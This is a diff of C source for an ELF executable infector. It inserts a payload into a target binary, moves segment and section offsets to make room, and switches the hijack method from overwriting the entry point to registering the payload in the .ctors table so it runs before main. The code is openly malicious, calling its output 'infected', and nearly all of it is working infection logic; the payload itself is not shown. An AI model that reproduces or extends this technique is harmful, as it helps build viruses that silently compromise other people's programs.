@@ -69,7 +69,8 @@ int main(int argc, char *argv[]){
   //find the nearest power of 8 that will hold the payload
   size_t alignedPayloadSize;
   size_t alignment = programHeader->p_align;
-  for(alignedPayloadSize=alignment; alignedPayloadSize < payloadSize + sizeof(ELFN(Addr)); alignedPayloadSize+=alignment){}
+  size_t ctorBufferSize = sizeof(ELFN(Addr)); //how much more room do we need for our new ctors?
+  for(alignedPayloadSize=alignment; alignedPayloadSize < payloadSize + ctorBufferSize; alignedPayloadSize+=alignment){}
 
   //allocate space for the new program header table and the payload
   infectedSize = targetSize + alignedPayloadSize;
@@ -103,43 +104,49 @@ int main(int argc, char *argv[]){
   for( i = 0, programHeader = infectedProgramHeaderTable;
        i < infectedElfHeader->e_phnum;
        i++, programHeader++ ){
-    if( programHeader->p_offset >= payloadOffset ){
+    //if it's right after the first LOAD segment, it likely contains the .ctors, so we want to
+    if( programHeader->p_offset == payloadOffset ){
+      programHeader->p_offset += alignedPayloadSize - ctorBufferSize;
+      programHeader->p_paddr -= ctorBufferSize;
+      programHeader->p_vaddr -= ctorBufferSize;
+      programHeader->p_filesz += ctorBufferSize;
+      programHeader->p_memsz += ctorBufferSize;
+    }
+    else if( programHeader->p_offset > payloadOffset ){
       programHeader->p_offset += alignedPayloadSize;
     }
   }
   for( i = 0, sectionHeader = infectedSectionHeaderTable;
        i < infectedElfHeader->e_shnum;
        i++, sectionHeader++ ){
-    if( sectionHeader->sh_offset >= payloadOffset ){
+    if( sectionHeader->sh_offset == payloadOffset ){
+      sectionHeader->sh_offset += alignedPayloadSize - ctorBufferSize;
+      sectionHeader->sh_addr -= ctorBufferSize;
+      sectionHeader->sh_size += ctorBufferSize;
+    }
+    else if( sectionHeader->sh_offset > payloadOffset ){
       sectionHeader->sh_offset += alignedPayloadSize;
     }
   }
 
-  //change the entry point to our payload
-  ELFN(Addr) oldEntryPoint = infectedElfHeader->e_entry;
-  infectedElfHeader->e_entry = payloadMemory;
-  *(ELFN(Addr)*)(infected + payloadOffset + payloadSize) = oldEntryPoint;
-
   //find the string table
-  //ELFN(Shdr) *infectedStringTable = infectedSectionHeaderTable + infectedElfHeader->e_shstrndx;
-  //char* infectedStringTableValues = infected + infectedStringTable->sh_offset;
+  ELFN(Shdr) *infectedStringTable = infectedSectionHeaderTable + infectedElfHeader->e_shstrndx;
+  char* infectedStringTableValues = infected + infectedStringTable->sh_offset;
 
-  ////find the .ctors
-  //ELFN(Shdr) *ctors;
-  //i = 0;
-  //for( i = 0, ctors = infectedSectionHeaderTable;
-  //     i < infectedElfHeader->e_shnum && strcmp(infectedStringTableValues + ctors->sh_name, ".ctors") != 0;
-  //     i++, ctors++ ){}
-  //if( i >= infectedElfHeader->e_shnum){
-  //  fprintf(stderr, "Unable to locate the .ctors table. LAME!\n");
-  //  return -1;
-  //}
+  //find the .ctors
+  ELFN(Shdr) *ctors;
+  i = 0;
+  for( i = 0, ctors = infectedSectionHeaderTable;
+       i < infectedElfHeader->e_shnum && strcmp(infectedStringTableValues + ctors->sh_name, ".ctors") != 0;
+       i++, ctors++ ){}
+  if( i >= infectedElfHeader->e_shnum){
+    fprintf(stderr, "Unable to locate the .ctors table. LAME!\n");
+    return -1;
+  }
 
-  ////add our payload to the ctors
-  //*(ELFN(Addr)*)(infected+ctors->sh_offset) = payloadMemory;
-  ////*(((ELFN(Addr)*)(infected+ctors->sh_offset)) + 1) = -1;
-  //*(((ELFN(Addr)*)(infected+ctors->sh_offset)) - 1) = -1;
-
+  //add our payload to the ctors
+  *(ELFN(Addr)*)(infected+ctors->sh_offset) = payloadMemory;
+  *(((ELFN(Addr)*)(infected+ctors->sh_offset)) - 1) = -1;
 
   //write out the newly infected file
   if( writeFile(argv[3], infected, infectedSize) != 0){
